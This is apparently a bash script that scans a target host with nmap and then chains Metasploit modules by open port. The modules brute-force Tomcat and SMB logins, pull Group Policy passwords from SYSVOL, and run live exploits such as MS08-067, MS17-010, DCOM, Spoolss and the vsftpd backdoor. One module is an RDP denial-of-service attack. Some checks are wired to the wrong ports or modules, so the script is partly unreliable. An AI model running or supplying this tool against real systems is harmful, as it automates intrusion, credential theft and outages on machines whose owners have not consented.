nmap -p445,8080,80,16992,3306,135,137,111,5900,21,22,139,3389,443 -sS -v --open "$1" > $(pwd)/nmap-$1.txt 
THREADS="30"
	if [[ $(cat $(pwd)/nmap-$1.txt | grep 8080 ) = *open* ]]; then 
	echo [+]"Bruteforcing Tomcat /manager/html"
	msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; setg RHOSTS \"$1\"; setg USER_FILE "$(pwd)/Dict/user.txt"; setg PASS_FILE "$(pwd)/Dict/pass.txt"; run; exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 8080 ) = *open* ]]; then
	echo -e [+]"Checking for JBoss"
	msfconsole -q -x "use auxiliary/scanner/http/jboss_status; setg RHOSTS \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 8080 ) = *open* ]]; then
	echo -e [+]"Checking for Wildfly"
	msfconsole -q -x "use auxiliary/scanner/http/wildfly_traversal; setg RHOSTS \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 137 ) = *open* ]]; then
	echo -e [+]"Checking for NBNAME"
	msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
	echo -e [+]"Checking SMB Version"
	msfconsole -q -x "use auxiliary/scanner/smb/smb_version; setg RHOSTS \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 111 ) = *open* ]]; then
	echo -e [+]"Checking of NFS"
	msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 22 ) = *open* ]]; then
	echo -e [+]"Checking for SSH version"
	msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version; setg RHOSTS \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
	echo -e [+]"Checking for BadBlue"
	msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
	echo -e [+]"Running Pipe Auditor"
	msfconsole -q -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 443 ) = *open* ]]; then
	echo -e [+]"Checking for Cert"
	msfconsole -q -x "use auxiliary/scanner/http/cert; setg RHOSTS \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 443 ) = *open* ]]; then
	echo -e [+]"Checking for HSTS"
	msfconsole -q -x "use auxiliary/scanner/http/http_hsts; setg RHOSTS \"$1\"; run; back;exit;"
	fi

	
	if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
	echo -e [+]"Crawling the application"
	msfconsole -q -x "use auxiliary/scanner/http/crawler; setg RHOST \"$1\"; run; back;exit;"
	fi

	if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
	echo [+]"Running SMB Brute"
	msfconsole -q -x "use auxiliary/scanner/smb/smb_login; setg RHOSTS \"$1\";set PASS_FILE $(pwd)/Dict/pass.txt; set USER_FILE $(pwd)/Dict/user.txt;run;back;exit;"
	fi

echo "Do you want to run WMAP? y/n"
	read input
	export WMAP=$input
	case $WMAP in
		y)
			
	if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
	echo [+]"Loading WMAP"
	msfconsole -q -x "load wmap; wmap_sites -a http://$1; wmap_targets -t http://$1; wmap_run -t; wmap_run -e;"
	fi	
	;;	
		n)
		if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
			echo [+]"Running MS08_067"
			msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi;set RHOST \"$1\"; check;back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
			echo [+]"Checking for MS17_10"
			sudo cp $(pwd)/exploits/smb_ms17_010.rb /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.13.13/modules/auxiliary/scanner/smb;
			cp $(pwd)/exploits/smb_ms17_010.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/http
			msfconsole reload_all -q -x "use auxiliary/scanner/smb/smb_ms17_010; setg RHOSTS \"$1\"; exploit; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
			echo [+]"Checking for GPP 'SYSVOL'"
			msfconsole reload_all -q -x "use auxiliary/scanner/smb/smb_enum_gpp; setg RHOSTS \"$1\"; exploit; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
			echo [+]"Checking Php Arg Injection"
			msfconsole -q -x "use exploit/multi/http/php_cgi_arg_injection; setg RHOST \"$1\"; run; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
			echo [+]"Checking for HTTP headers"
			msfconsole -q -x "use auxiliary/scanner/http/http_header; setg RHOSTS \"$1\"; run; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 16992 ) = *open* ]]; then
			echo [+]"Checking for Intel AMT Digest"
			sudo cp $(pwd)/exploits/intel_amt_digest_bypass.rb /opt/metasploit/apps/pro/vendor/bundle/ruby/2.3.0/gems/metasploit-framework-4.13.13/modules/auxiliary/scanner/http; cp $(pwd)/exploits/intel_amt_digest_bypass.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/http
			msfconsole reload_all -q -x "use auxiliary/scanner/http/intel_amt_digest_bypass; setg RHOSTS \"$1\"; rerun; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 3306 ) = *open* ]]; then
			echo [+]"Checking for MYSQL"
			msfconsole -q -x "use auxiliary/scanner/mssql/mssql_ping; setg RHOSTS \"$1\"; run; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 135 ) = *open* ]]; then
			echo [+]"Checking for Port 135, If you get the string 'Sending Exploit' the System might be Vulnerable to DCOM"
			msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST \"$1\"; run; back; exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 5900 ) = *open* ]]; then
			echo [+]"Checking for VNC Authentication None Detection"
			msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; setg RHOSTS \"$1\"; run; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 21 ) = *open* ]]; then
			echo [+]"Checking FTP Version"
			msfconsole -q -x "use auxiliary/scanner/ftp/ftp_version ; setg RHOSTS \"$1\"; run; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 5900 ) = *open* ]]; then
			echo [+]"Checking for VSFTPD Backdoor"
			msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOST \"$1\"; run; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 5900 ) = *open* ]]; then
			echo [+]"Checking of anonymous FTP login"
			msfconsole -q -x "use auxiliary/scanner/ftp/anonymous; setg RHOSTS \"$1\"; run; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 3389 ) = *open* ]]; then
			echo [+]"Trying Rdesktop with Guest Login"
			xfreerdp -u guest -p guest $1
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 3389 ) = *open* ]]; then
			echo [+]"Trying MS_12_020"
			msfconsole -q -x "use auxiliary/scanner/rdp/ms12_020_check; setg RHOSTS \"$1\";exploit; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
			echo [+]"Trying MS10_061 Spoolss"
			msfconsole -q -x "use exploit/windows/smb/ms10_061_spoolss; setg RHOST \"$1\";exploit; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
			echo [+]"Trying MS09_050 Ngotiate Func"
			msfconsole -q -x "use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; setg RHOST \"$1\";exploit; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
			echo [+]"Checking for HTTP Methods"
			msfconsole -q -x "use auxiliary/scanner/http/options; setg RHOSTS \"$1\";exploit; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 80 ) = *open* ]]; then
			echo [+]"Checking for HTTP Memory Dump"
			msfconsole -q -x "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump; setg RHOSTS \"$1\";set WAIT 2;exploit; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
			echo [+]"Trying MS06_040 Netapi"
			msfconsole -q -x "use exploit/windows/smb/ms06_040_netapi; setg RHOST \"$1\";exploit; back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 445 ) = *open* ]]; then
			echo [+]"Trying MS05_039 PNP"
			msfconsole -q -x "use exploit/windows/smb/ms05_039_pnp; setg RHOST \"$1\";check;back;exit;"
		fi

		if [[ $(cat $(pwd)/nmap-$1.txt | grep 3389 ) = *open* ]]; then
			echo [+]"Trying MS_12_020"
			msfconsole -q -x "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; setg RHOST \"$1\";exploit; back;exit;"
		fi
		;;
	esac
